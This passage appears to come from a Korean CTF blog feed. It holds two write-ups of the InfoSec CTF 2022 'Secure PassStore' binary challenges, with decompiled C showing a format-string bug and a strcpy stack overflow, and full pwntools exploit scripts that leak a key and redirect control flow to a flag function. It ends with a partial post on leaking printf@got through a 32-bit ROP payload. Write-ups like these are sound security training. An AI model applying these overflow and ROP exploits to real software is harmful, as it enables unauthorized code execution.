        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>New! More secure! Latest version of Secure PassStoreV2! Url: 0.cloud.chals.io:15467</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── passStoreV2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1ff9162a72b5d184e7101eae1706a6eb6b57e374, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>바로 전 문제인 version 1과의 차이는 하나다. 바로 key를 출력을 안해준다는 것.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printf는 null 바이트를 만나기 전까지 출력한다. 이를 이용해서 username 바로 뒤에 존재하는 key 값을 leak할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000004040A0 username        db 20h dup(?)           ; DATA XREF: addName(void)+18↑o</span><br><span class="line">.bss:00000000004040A0                                         ; changeName(void)+18↑o ...</span><br><span class="line">.bss:00000000004040C0                 public key</span><br><span class="line">.bss:00000000004040C0 key             db    ? ;               ; DATA XREF: readPass(void)+6C↑o</span><br><span class="line">.bss:00000000004040C0                                         ; addPass(void)+70↑o ...</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>name을 0x20 바이트 꽉 채워 보내고 key 값 leak</li><li>payload 작성 후 addPass 함수의 로직 구현</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">15467</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">name += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1f</span></span><br><span class="line">name += <span class="string">b&#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">key = p.recvuntil(<span class="string">&#x27;P&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40160B</span>) <span class="comment"># 0x40160a</span></span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line"></span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pas5St0r3_15_n07_600d_50lu710n_;(&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV1</title>
      <link href="/221207-infosecctf2022-secure_passstorev1/"/>
      <url>/221207-infosecctf2022-secure_passstorev1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Try to use new superpuper secure command line password storage!</p><p>url: 0.cloud.chals.io:12367</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── passStoreV1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2349feff7fdc9215b7e1275413f61af630980a82, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>문제 풀다가 바이너리가 바뀌었다. &#x3D;ㅅ&#x3D; 원래 파이가 있었는데 파이가 사라졌다. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  welcome();</span><br><span class="line">  addName();</span><br><span class="line">  keyGen();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main은 이렇게 생겼다. welcome 함수는 볼 게 없어서 그 다음 함수부터 보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">addName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>전역 변수 username에 0x20 만큼 쓸 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">keyGen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some preparations....&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    key[i] = rand() % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Master key prepared!\nKey: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(key);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key를 출력해준다. 여기서 fsb가 발생할 수 있지만.. 컨트롤하기가 꽤 까다로워보인다. 아무튼 출력해주는 key를 뒤에서 어떻게 사용할까 생각하면서 일단 넘어간다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Menu: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1) Add password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2) Read password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3) Chage name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0) Exit&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> changeName();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> readPass();</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye Bye.... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        result = addPass();</span><br><span class="line">        encrypted = result;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>menu 함수는 while을 통해 무한히 실행된다. 여기서 주목해야할 것이 3번메뉴 changeName 함수와 1번 메뉴 addPass 함수이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username); <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>먼저 changeName 함수. 대놓고 fsb가 터진다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">addPass</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+100h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">44</span>]; <span class="comment">// [rsp+200h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+22Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src[i] = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    src[i] = key[i % <span class="number">8</span>] ^ buf[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(&amp;encrypted, dest, <span class="number">0x1F</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addPass 함수. dest 크기가 44인데 여기다가 256 크기의 src를 복사한다. 대놓고 bof가 터지고 pie도 없다. flag를 출력해주는 함수도 존재하니 바로 흐름을 돌려주면 된다. 하지만 이 전에 src를 가공하니 exploit을 작성할 때 유의해줘야 한다. </p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>strcpy 함수는 복사할 때 길이 검증을 하지 않아 bof 발생 가능성이 존재한다. 이 문제에서 이로 인해 함수 흐름을 변경할 수 있는 가능성이 존재한다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>key 값 leak</li><li>payload 작성 후 addPass 함수의 로직 구현</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">12367</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Key: \r\n&#x27;</span>)</span><br><span class="line">key = p.recvline()[:-<span class="number">2</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;it\r\n&#x27;, str(3))</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;name:&#x27;, b&#x27;%7$p&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="comment"># e.address = int(p.recv(14), 16) - 0x1543</span></span><br><span class="line"><span class="comment"># info(hex(e.address))</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40162d</span>)</span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(buf))</span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#src[i] = key[i%8] ^ buf[i]</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line">    </span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="python3-bytes"><a href="#python3-bytes" class="headerlink" title="python3 bytes"></a>python3 bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>src = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(src)</span><br><span class="line"><span class="string">b&#x27;\x01\x02\x03&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hmmm...1_7h0u6h7_17_15_53cur3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Why GOT is not printed clearly when using printf</title>
      <link href="/221202-why_got_is_not_printed_clearly_when_using_printf/"/>
      <url>/221202-why_got_is_not_printed_clearly_when_using_printf/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>32bit 워게임 프로그램에서 GOT를 출력하고자 했을 때 4바이트가 출력되지 않고 그 이상의 값이 출력되었다. 그 이유는 leak할 때 사용한 <code>printf</code> 함수는 null byte를 만나기 전까지 출력하기 때문이다.</p><h2 id="Why-GOT-is-not-printed-clearly-when-using-printf"><a href="#Why-GOT-is-not-printed-clearly-when-using-printf" class="headerlink" title="Why GOT is not printed clearly when using printf"></a>Why GOT is not printed clearly when using printf</h2><h3 id="printf를-사용하여-GOT를-print-leak-할-때-명확하게-되지-않는-이유"><a href="#printf를-사용하여-GOT를-print-leak-할-때-명확하게-되지-않는-이유" class="headerlink" title="printf를 사용하여 GOT를 print(leak)할 때 명확하게 되지 않는 이유"></a>printf를 사용하여 GOT를 print(leak)할 때 명확하게 되지 않는 이유</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x2c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br></pre></td></tr></table></figure><p>32bit 워게임 문제를 풀다가 rop를 해야하는 상황이 있었다. libc system 함수 실제 주소를 구하기 위해 <code>printf@got</code>를 leak하려고 했는데 4바이트 이상의 바이트가 아래와 같이 출력되었다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0\x0f\xf7М\xc7\xf7\x96\x8`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7</span><br></pre></td></tr></table></figure><p><code>atoi@got</code>는 깔끔하게 4바이트가 출력되었는데 <code>printf@got</code>는 4바이트 이상의 문자열이 출력되는 것이 이상하다고 생각되어서 디버깅을 해보았다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; der $_got()</span><br><span class="line">0x8049ffc│+0x0000:  add BYTE PTR [eax], al</span><br><span class="line">0x804a000│+0x0004: 0x8049f14  →  &lt;_DYNAMIC+0&gt; add DWORD PTR [eax], eax</span><br><span class="line">0x804a004│+0x0008: 0xf7f0ea20  →  0x00000000</span><br><span class="line">0x804a008│+0x000c: 0xf7eebc00  →   endbr32</span><br><span class="line">0x804a00c│+0x0010: 0xf7c50f30  →  &lt;printf+0&gt; endbr32</span><br><span class="line">0x804a010│+0x0014: 0xf7c79cd0  →  &lt;getchar+0&gt; endbr32</span><br><span class="line">0x804a014│+0x0018: 0x8048396  →  &lt;__gmon_start__@plt+6&gt; push 0x10</span><br><span class="line">0x804a018│+0x001c: 0xf7c1f160  →  &lt;__libc_start_main+0&gt; endbr32</span><br><span class="line">0x804a01c│+0x0020: 0xf7c73890  →  &lt;setvbuf+0&gt; endbr32</span><br><span class="line">0x804a020│+0x0024: 0xf7c370c0  →  &lt;atoi+0&gt; endbr32</span><br></pre></td></tr></table></figure><p><code>0x804a00c</code> 주소를 출력하면 <code>0xf7c50f30</code>가 깔끔하게 print(leak) 될 줄 알았다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; print-format -l 40 --bitlen 8 --lang py 0x804a00c</span><br><span class="line">buf = [0x30, 0xf, 0xc5, 0xf7, 0xd0, 0x9c, 